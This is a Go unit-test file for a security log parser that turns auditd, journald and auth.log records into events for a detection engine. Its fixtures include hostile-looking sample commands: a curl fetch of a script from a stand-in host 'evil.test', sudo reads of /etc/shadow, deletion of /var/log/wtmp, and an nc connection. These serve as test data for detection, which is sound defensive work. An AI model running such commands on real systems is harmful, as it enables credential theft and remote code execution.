package parser

import (
	"encoding/hex"
	"encoding/json"
	"strings"
	"testing"
	"time"
)

// hexOf is a readability helper for the encoded fields auditd writes when a
// value contains spaces or quotes.
func hexOf(s string) string { return hex.EncodeToString([]byte(s)) }

func TestAuParseKV(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want []auKV
	}{
		{
			name: "bare and quoted",
			in:   `type=SYSCALL pid=1234 comm="bash" exe="/usr/bin/bash"`,
			want: []auKV{
				{Key: "type", Val: "SYSCALL"},
				{Key: "pid", Val: "1234"},
				{Key: "comm", Val: "bash", Quoted: true},
				{Key: "exe", Val: "/usr/bin/bash", Quoted: true},
			},
		},
		{
			name: "single-quoted value keeps inner double quotes",
			in:   `pid=9 msg='op=PAM:authentication acct="root" res=success'`,
			want: []auKV{
				{Key: "pid", Val: "9"},
				{Key: "msg", Val: `op=PAM:authentication acct="root" res=success`, Quoted: true},
			},
		},
		{
			name: "audit id stays one bare token",
			in:   `msg=audit(1700000000.123:456): arch=c000003e`,
			want: []auKV{
				{Key: "msg", Val: "audit(1700000000.123:456):"},
				{Key: "arch", Val: "c000003e"},
			},
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := auParseKV(tc.in)
			if len(got) != len(tc.want) {
				t.Fatalf("got %d tokens %v, want %d", len(got), got, len(tc.want))
			}
			for i := range got {
				if got[i] != tc.want[i] {
					t.Errorf("token %d = %+v, want %+v", i, got[i], tc.want[i])
				}
			}
		})
	}
}

func TestAuHexDecode(t *testing.T) {
	tests := []struct {
		name  string
		in    string
		want  string
		wantK bool
	}{
		{"plain path", hexOf("/usr/bin/curl"), "/usr/bin/curl", true},
		{"value with spaces", hexOf(`sh -c "id"`), `sh -c "id"`, true},
		{"proctitle nul separated", hexOf("bash\x00-c\x00id\x00"), "bash -c id", true},
		{"odd length rejected", "abc", "", false},
		{"non hex rejected", "zzzz", "", false},
		{"binary garbage rejected", "abcdef", "", false},
		{"control chars rejected", "0102", "", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, ok := auHexDecode(tc.in)
			if ok != tc.wantK || got != tc.want {
				t.Errorf("auHexDecode(%q) = (%q,%v), want (%q,%v)", tc.in, got, ok, tc.want, tc.wantK)
			}
		})
	}
}

// A SYSCALL a0 is a raw register value and must NEVER be hex-decoded; an EXECVE
// a0 is argv and must be.
func TestAuDecodeValue_ArgvOnlyOnExecve(t *testing.T) {
	encoded := hexOf("-la")
	if got := auDecodeValue("EXECVE", "a1", encoded, false); got != "-la" {
		t.Errorf("EXECVE a1 = %q, want %q", got, "-la")
	}
	if got := auDecodeValue("SYSCALL", "a0", "7ffd1a2b3c40", false); got != "7ffd1a2b3c40" {
		t.Errorf("SYSCALL a0 = %q, want it left alone", got)
	}
	if got := auDecodeValue("SYSCALL", "arch", "c000003e", false); got != "c000003e" {
		t.Errorf("arch = %q, want it left alone", got)
	}
	if got := auDecodeValue("SYSCALL", "key", "(null)", false); got != "" {
		t.Errorf("key=(null) = %q, want empty", got)
	}
	if got := auDecodeValue("SYSCALL", "exe", `/usr/bin/id`, true); got != "/usr/bin/id" {
		t.Errorf("quoted exe = %q", got)
	}
}

func TestAuExecveArgIndex(t *testing.T) {
	tests := []struct {
		key  string
		idx  int
		frag int
		ok   bool
	}{
		{"a0", 0, -1, true},
		{"a12", 12, -1, true},
		{"a2[0]", 2, 0, true},
		{"a2[1]", 2, 1, true},
		{"argc", 0, 0, false},
		{"auid", 0, 0, false},
		{"a", 0, 0, false},
		{"a1_len", 0, 0, false},
	}
	for _, tc := range tests {
		idx, frag, ok := auExecveArgIndex(tc.key)
		if ok != tc.ok || (ok && (idx != tc.idx || frag != tc.frag)) {
			t.Errorf("auExecveArgIndex(%q) = (%d,%d,%v), want (%d,%d,%v)", tc.key, idx, frag, ok, tc.idx, tc.frag, tc.ok)
		}
	}
}

// The core contract: records sharing an audit(...) id are ONE event, EXECVE argv
// is joined into a command line, hex fields are decoded and the synthetic
// EventID category is set.
func TestAuMergeRecords(t *testing.T) {
	tests := []struct {
		name string
		log  string
		want LinuxEvent
	}{
		{
			name: "syscall + execve + cwd + path merge into one process_creation",
			log: strings.Join([]string{
				`type=SYSCALL msg=audit(1700000000.123:456): arch=c000003e syscall=59 success=yes exit=0 a0=7ffd1a2b ppid=1200 pid=1234 auid=1000 uid=0 gid=0 tty=pts0 ses=3 comm="curl" exe="/usr/bin/curl" key="exec"`,
				`type=EXECVE msg=audit(1700000000.123:456): argc=3 a0="curl" a1="-fsSL" a2="http://evil.test/a.sh"`,
				`type=CWD msg=audit(1700000000.123:456): cwd="/root"`,
				`type=PATH msg=audit(1700000000.123:456): item=0 name="/usr/bin/curl" inode=123 mode=0100755`,
			}, "\n"),
			want: LinuxEvent{
				Time: "2023-11-14T22:13:20Z", Source: "auditd", RecordType: "SYSCALL",
				EventID: evProcessCreation, Executable: "/usr/bin/curl",
				CommandLine: "curl -fsSL http://evil.test/a.sh", Comm: "curl",
				PID: 1234, PPID: 1200, UID: "0", AUID: "1000", TTY: "pts0",
				CWD: "/root", Path: "/usr/bin/curl", Key: "exec", Success: "yes",
				Host: "testhost",
			},
		},
		{
			name: "hex-encoded exe/cwd/argv are decoded",
			log: strings.Join([]string{
				`type=SYSCALL msg=audit(1700000001.000:457): arch=c000003e syscall=59 success=yes ppid=1 pid=99 auid=1000 uid=1000 comm=` + hexOf("my prog") + ` exe=` + hexOf("/opt/my prog/bin") + ` key=` + hexOf("exec watch"),
				`type=EXECVE msg=audit(1700000001.000:457): argc=2 a0=` + hexOf("/opt/my prog/bin") + ` a1=` + hexOf(`sh -c "id"`),
				`type=CWD msg=audit(1700000001.000:457): cwd=` + hexOf("/home/a b"),
			}, "\n"),
			want: LinuxEvent{
				Time: "2023-11-14T22:13:21Z", Source: "auditd", RecordType: "SYSCALL",
				EventID: evProcessCreation, Executable: "/opt/my prog/bin",
				CommandLine: `/opt/my prog/bin sh -c "id"`, Comm: "my prog",
				PID: 99, PPID: 1, UID: "1000", AUID: "1000", CWD: "/home/a b",
				Key: "exec watch", Success: "yes", Host: "testhost",
			},
		},
		{
			name: "split EXECVE argv fragments are concatenated in order",
			log: strings.Join([]string{
				`type=SYSCALL msg=audit(1700000002.000:458): arch=c000003e syscall=59 success=yes ppid=2 pid=3 uid=0 comm="bash" exe="/bin/bash"`,
				`type=EXECVE msg=audit(1700000002.000:458): argc=2 a0="bash" a1_len=12 a1[0]=` + hexOf("echo ") + ` a1[1]=` + hexOf("hello"),
			}, "\n"),
			want: LinuxEvent{
				Time: "2023-11-14T22:13:22Z", Source: "auditd", RecordType: "SYSCALL",
				EventID: evProcessCreation, Executable: "/bin/bash",
				CommandLine: "bash echo hello", Comm: "bash",
				PID: 3, PPID: 2, UID: "0", Success: "yes", Host: "testhost",
			},
		},
		{
			name: "USER_CMD nested msg yields user_cmd with the sudo command line",
			log:  `type=USER_CMD msg=audit(1700000003.000:459): pid=2000 uid=1000 auid=1000 ses=3 msg='cwd="/home/user" cmd=` + hexOf("cat /etc/shadow") + ` terminal=pts/0 res=success'`,
			want: LinuxEvent{
				Time: "2023-11-14T22:13:23Z", Source: "auditd", RecordType: "USER_CMD",
				EventID: evUserCmd, CommandLine: "cat /etc/shadow",
				PID: 2000, UID: "1000", AUID: "1000", TTY: "pts/0", CWD: "/home/user",
				Success: "success", Host: "testhost",
			},
		},
		{
			name: "USER_AUTH yields user_auth with the account",
			log:  `type=USER_AUTH msg=audit(1700000004.000:460): pid=900 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct="root" exe="/usr/sbin/sshd" hostname=10.0.0.9 addr=10.0.0.9 terminal=ssh res=failed'`,
			want: LinuxEvent{
				Time: "2023-11-14T22:13:24Z", Source: "auditd", RecordType: "USER_AUTH",
				EventID: evUserAuth, Executable: "/usr/sbin/sshd",
				PID: 900, UID: "0", AUID: "4294967295", User: "root", TTY: "ssh",
				Success: "failed", Host: "testhost",
			},
		},
		{
			name: "PATH-bearing unlink is file_access",
			log: strings.Join([]string{
				`type=SYSCALL msg=audit(1700000005.000:461): arch=c000003e syscall=87 success=yes ppid=1 pid=55 uid=0 comm="rm" exe="/bin/rm" key="delete"`,
				`type=PATH msg=audit(1700000005.000:461): item=0 name="/var/log/wtmp"`,
			}, "\n"),
			want: LinuxEvent{
				Time: "2023-11-14T22:13:25Z", Source: "auditd", RecordType: "SYSCALL",
				EventID: evFileAccess, Executable: "/bin/rm", Comm: "rm",
				PID: 55, PPID: 1, UID: "0", Path: "/var/log/wtmp", Key: "delete",
				Success: "yes", Host: "testhost",
			},
		},
		{
			name: "connect syscall is network",
			log:  `type=SYSCALL msg=audit(1700000006.000:462): arch=c000003e syscall=42 success=yes ppid=1 pid=77 uid=0 comm="nc" exe="/bin/nc"`,
			want: LinuxEvent{
				Time: "2023-11-14T22:13:26Z", Source: "auditd", RecordType: "SYSCALL",
				EventID: evNetwork, Executable: "/bin/nc", Comm: "nc",
				PID: 77, PPID: 1, UID: "0", Success: "yes", Host: "testhost",
			},
		},
		{
			name: "unclassified syscall falls back to other",
			log:  `type=SYSCALL msg=audit(1700000007.000:463): arch=c000003e syscall=39 success=yes ppid=1 pid=88 uid=0 comm="sh" exe="/bin/sh"`,
			want: LinuxEvent{
				Time: "2023-11-14T22:13:27Z", Source: "auditd", RecordType: "SYSCALL",
				EventID: evOther, Executable: "/bin/sh", Comm: "sh",
				PID: 88, PPID: 1, UID: "0", Success: "yes", Host: "testhost",
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := auParseAuditChunk(tc.log, "testhost")
			if len(got) != 1 {
				t.Fatalf("got %d events, want 1: %+v", len(got), got)
			}
			ev := got[0]
			if ev.Raw == "" {
				t.Error("Raw must carry the original record(s)")
			}
			ev.Raw = "" // compared separately
			if ev != tc.want {
				t.Errorf("event mismatch\n got: %+v\nwant: %+v", ev, tc.want)
			}
		})
	}
}

// Interleaved records from different audit ids must not bleed into each other.
func TestAuMergeRecords_MultipleInterleavedEvents(t *testing.T) {
	log := strings.Join([]string{
		`type=SYSCALL msg=audit(1700000010.000:500): arch=c000003e syscall=59 success=yes ppid=1 pid=10 uid=0 comm="a" exe="/bin/a"`,
		`type=SYSCALL msg=audit(1700000011.000:501): arch=c000003e syscall=59 success=yes ppid=1 pid=11 uid=0 comm="b" exe="/bin/b"`,
		`type=EXECVE msg=audit(1700000010.000:500): argc=1 a0="a"`,
		`type=EXECVE msg=audit(1700000011.000:501): argc=2 a0="b" a1="--flag"`,
		``,
		`garbage line that is not an audit record`,
	}, "\n")

	got := auParseAuditChunk(log, "h")
	if len(got) != 2 {
		t.Fatalf("got %d events, want 2: %+v", len(got), got)
	}
	if got[0].CommandLine != "a" || got[0].PID != 10 {
		t.Errorf("event 0 = %+v", got[0])
	}
	if got[1].CommandLine != "b --flag" || got[1].PID != 11 {
		t.Errorf("event 1 = %+v", got[1])
	}
	if !strings.Contains(got[0].Raw, "type=SYSCALL") || !strings.Contains(got[0].Raw, "type=EXECVE") {
		t.Errorf("Raw should join every record of the group: %q", got[0].Raw)
	}
}

func TestAuSyscallName(t *testing.T) {
	tests := []struct{ arch, num, want string }{
		{"c000003e", "59", "execve"},
		{"c000003e", "42", "connect"},
		{"c000003e", "257", "openat"},
		{"c00000b7", "221", "execve"},
		{"40000003", "11", "execve"},
		{"deadbeef", "59", ""},
		{"c000003e", "execve", "execve"}, // auditd -i already interprets
		{"c000003e", "", ""},
	}
	for _, tc := range tests {
		if got := auSyscallName(tc.arch, tc.num); got != tc.want {
			t.Errorf("auSyscallName(%q,%q) = %q, want %q", tc.arch, tc.num, got, tc.want)
		}
	}
}

func TestAuJournalToEvent(t *testing.T) {
	tests := []struct {
		name       string
		raw        string
		wantOK     bool
		wantType   string
		wantID     string
		wantComm   string
		wantPID    int
		wantCmdCon string
	}{
		{
			name:     "sudo command",
			raw:      `{"__REALTIME_TIMESTAMP":"1700000000000000","_COMM":"sudo","_EXE":"/usr/bin/sudo","_PID":"4242","_UID":"1000","SYSLOG_IDENTIFIER":"sudo","MESSAGE":"user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/cat /etc/shadow","_CMDLINE":"sudo cat /etc/shadow"}`,
			wantOK:   true,
			wantType: "USER_CMD", wantID: evUserCmd, wantComm: "sudo", wantPID: 4242,
			wantCmdCon: "sudo cat",
		},
		{
			name:     "sshd auth failure",
			raw:      `{"__REALTIME_TIMESTAMP":"1700000001000000","_COMM":"sshd","_PID":"8","SYSLOG_IDENTIFIER":"sshd","MESSAGE":"Failed password for invalid user admin from 10.0.0.1 port 5 ssh2"}`,
			wantOK:   true,
			wantType: "USER_AUTH", wantID: evUserAuth, wantComm: "sshd", wantPID: 8,
		},
		{
			name:     "ordinary daemon chatter",
			raw:      `{"__REALTIME_TIMESTAMP":"1700000002000000","_COMM":"cron","SYSLOG_IDENTIFIER":"CRON","MESSAGE":"pam_unix(cron:session): session opened for user root"}`,
			wantOK:   true,
			wantType: "USER_AUTH", wantID: evUserAuth, wantComm: "cron",
		},
		{
			name:     "non-auth message is other",
			raw:      `{"__REALTIME_TIMESTAMP":"1700000003000000","_COMM":"kernel","MESSAGE":"eth0: link up"}`,
			wantOK:   true,
			wantType: "JOURNAL", wantID: evOther, wantComm: "kernel",
		},
		{
			name:   "no timestamp is dropped",
			raw:    `{"_COMM":"sshd","MESSAGE":"hi"}`,
			wantOK: false,
		},
		{
			name:     "byte-array MESSAGE is decoded",
			raw:      `{"__REALTIME_TIMESTAMP":"1700000004000000","_COMM":"su","MESSAGE":[70,97,105,108,101,100,32,112,97,115,115,119,111,114,100]}`,
			wantOK:   true,
			wantType: "USER_AUTH", wantID: evUserAuth, wantComm: "su",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			var entry map[string]json.RawMessage
			if err := json.Unmarshal([]byte(tc.raw), &entry); err != nil {
				t.Fatalf("bad fixture: %v", err)
			}
			ev, ok := auJournalToEvent(entry, "h")
			if ok != tc.wantOK {
				t.Fatalf("ok = %v, want %v", ok, tc.wantOK)
			}
			if !ok {
				return
			}
			if ev.Source != "journald" {
				t.Errorf("Source = %q", ev.Source)
			}
			if ev.RecordType != tc.wantType || ev.EventID != tc.wantID {
				t.Errorf("type/id = %q/%q, want %q/%q", ev.RecordType, ev.EventID, tc.wantType, tc.wantID)
			}
			if ev.Comm != tc.wantComm || (tc.wantPID != 0 && ev.PID != tc.wantPID) {
				t.Errorf("comm/pid = %q/%d, want %q/%d", ev.Comm, ev.PID, tc.wantComm, tc.wantPID)
			}
			if tc.wantCmdCon != "" && !strings.Contains(ev.CommandLine, tc.wantCmdCon) {
				t.Errorf("CommandLine = %q, want to contain %q", ev.CommandLine, tc.wantCmdCon)
			}
			if _, err := time.Parse(time.RFC3339, ev.Time); err != nil {
				t.Errorf("Time %q is not RFC3339: %v", ev.Time, err)
			}
		})
	}
}

func TestAuParseAuthLogLine(t *testing.T) {
	now := time.Date(2024, 6, 1, 12, 0, 0, 0, time.UTC)
	tests := []struct {
		name     string
		line     string
		wantOK   bool
		wantID   string
		wantUser string
		wantCmd  string
		wantOK2  string // Success
	}{
		{
			name:   "sudo command",
			line:   `May 30 09:15:02 web01 sudo:  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow`,
			wantOK: true, wantID: evUserCmd, wantUser: "alice",
			wantCmd: "/usr/bin/cat /etc/shadow", wantOK2: "yes",
		},
		{
			name:   "sshd accepted",
			line:   `May 30 09:16:00 web01 sshd[2211]: Accepted publickey for bob from 10.0.0.5 port 4444 ssh2`,
			wantOK: true, wantID: evUserAuth, wantUser: "bob", wantOK2: "yes",
		},
		{
			name:   "sshd invalid user",
			line:   `May 30 09:17:00 web01 sshd[2212]: Failed password for invalid user oracle from 10.0.0.5 port 4445 ssh2`,
			wantOK: true, wantID: evUserAuth, wantUser: "oracle", wantOK2: "no",
		},
		{
			name:   "su session",
			line:   `May 30 09:18:00 web01 su[900]: pam_unix(su:session): session opened for user root by alice(uid=1000)`,
			wantOK: true, wantID: evUserAuth, wantUser: "root", wantOK2: "yes",
		},
		{
			name:   "rfc3339 stamp",
			line:   `2024-05-30T09:19:00+00:00 web01 sshd[2213]: Accepted password for carol from 10.0.0.6 port 22 ssh2`,
			wantOK: true, wantID: evUserAuth, wantUser: "carol", wantOK2: "yes",
		},
		{name: "unrelated daemon", line: `May 30 09:20:00 web01 cron[1]: (root) CMD (run-parts)`, wantOK: false},
		{name: "short line", line: `May 30 09:20:00`, wantOK: false},
		{name: "empty", line: ``, wantOK: false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			ev, ok := auParseAuthLogLine(tc.line, now, "fallback")
			if ok != tc.wantOK {
				t.Fatalf("ok = %v, want %v", ok, tc.wantOK)
			}
			if !ok {
				return
			}
			if ev.Source != "authlog" {
				t.Errorf("Source = %q", ev.Source)
			}
			if ev.EventID != tc.wantID {
				t.Errorf("EventID = %q, want %q", ev.EventID, tc.wantID)
			}
			if ev.User != tc.wantUser {
				t.Errorf("User = %q, want %q", ev.User, tc.wantUser)
			}
			if tc.wantCmd != "" && ev.CommandLine != tc.wantCmd {
				t.Errorf("CommandLine = %q, want %q", ev.CommandLine, tc.wantCmd)
			}
			if ev.Success != tc.wantOK2 {
				t.Errorf("Success = %q, want %q", ev.Success, tc.wantOK2)
			}
			if _, err := time.Parse(time.RFC3339, ev.Time); err != nil {
				t.Errorf("Time %q is not RFC3339: %v", ev.Time, err)
			}
		})
	}
}

// A syslog stamp with no year that lands in the future belongs to last year.
func TestAuParseAuthLogLine_YearRollover(t *testing.T) {
	now := time.Date(2024, 1, 2, 0, 0, 0, 0, time.UTC)
	ev, ok := auParseAuthLogLine(`Dec 31 23:00:00 h sshd[1]: Accepted password for u from 1.2.3.4 port 2 ssh2`, now, "h")
	if !ok {
		t.Fatal("expected the line to parse")
	}
	if !strings.HasPrefix(ev.Time, "2023-12-31") {
		t.Errorf("Time = %q, want a 2023 stamp", ev.Time)
	}
}

func TestAuFilterAndCap(t *testing.T) {
	mk := func(ts, cmd string) LinuxEvent {
		return LinuxEvent{Time: ts, CommandLine: cmd, EventID: evProcessCreation}
	}
	evts := []LinuxEvent{
		mk("2024-01-01T00:00:00Z", "old thing"),
		mk("2024-06-01T10:00:00Z", "curl http://evil"),
		mk("2024-06-01T11:00:00Z", "ls -la"),
	}

	since := time.Date(2024, 5, 1, 0, 0, 0, 0, time.UTC)
	if got := auFilterEvents(evts, since, ""); len(got) != 2 {
		t.Errorf("time filter kept %d, want 2", len(got))
	}
	if got := auFilterEvents(evts, time.Time{}, ""); len(got) != 3 {
		t.Errorf("no time filter kept %d, want 3", len(got))
	}
	got := auFilterEvents(evts, time.Time{}, "CURL")
	if len(got) != 1 || got[0].CommandLine != "curl http://evil" {
		t.Errorf("keyword filter = %+v", got)
	}
	// Capping keeps the NEWEST events.
	capped := auCapNewest(append([]LinuxEvent(nil), evts...), 2)
	if len(capped) != 2 || capped[0].Time != "2024-06-01T10:00:00Z" || capped[1].Time != "2024-06-01T11:00:00Z" {
		t.Errorf("auCapNewest = %+v", capped)
	}
}

func TestLinuxEventOptionsNormalize(t *testing.T) {
	tests := []struct {
		in   LinuxEventOptions
		want LinuxEventOptions
	}{
		{LinuxEventOptions{}, LinuxEventOptions{Max: defaultLinuxEventMax}},
		{LinuxEventOptions{Max: -5}, LinuxEventOptions{Max: defaultLinuxEventMax}},
		{LinuxEventOptions{Max: 999999}, LinuxEventOptions{Max: maxLinuxEventMax}},
		{LinuxEventOptions{Hours: -3, Max: 10, Keyword: "  bash "}, LinuxEventOptions{Max: 10, Keyword: "bash"}},
	}
	for _, tc := range tests {
		if got := tc.in.normalize(); got != tc.want {
			t.Errorf("normalize(%+v) = %+v, want %+v", tc.in, got, tc.want)
		}
	}
}

func TestAuParsePasswd(t *testing.T) {
	got := auParsePasswd("root:x:0:0:root:/root:/bin/bash\n# comment\nalice:x:1000:1000::/home/alice:/bin/sh\nbroken\n")
	if got["0"] != "root" || got["1000"] != "alice" {
		t.Errorf("auParsePasswd = %v", got)
	}
	if len(got) != 2 {
		t.Errorf("expected 2 entries, got %v", got)
	}
}

// The wire shape is a contract shared with the backend/Sigma engine — pin the
// JSON keys.
func TestLinuxEventJSONShape(t *testing.T) {
	b, err := json.Marshal(LinuxEvent{})
	if err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(b, &m); err != nil {
		t.Fatal(err)
	}
	for _, k := range []string{
		"time", "source", "record_type", "event_id", "executable", "command_line",
		"parent_exe", "comm", "pid", "ppid", "user", "uid", "auid", "tty", "cwd",
		"path", "key", "success", "host", "raw",
	} {
		if _, ok := m[k]; !ok {
			t.Errorf("missing JSON key %q", k)
		}
	}
	if len(m) != 20 {
		t.Errorf("LinuxEvent has %d JSON keys, want 20: %v", len(m), m)
	}
}
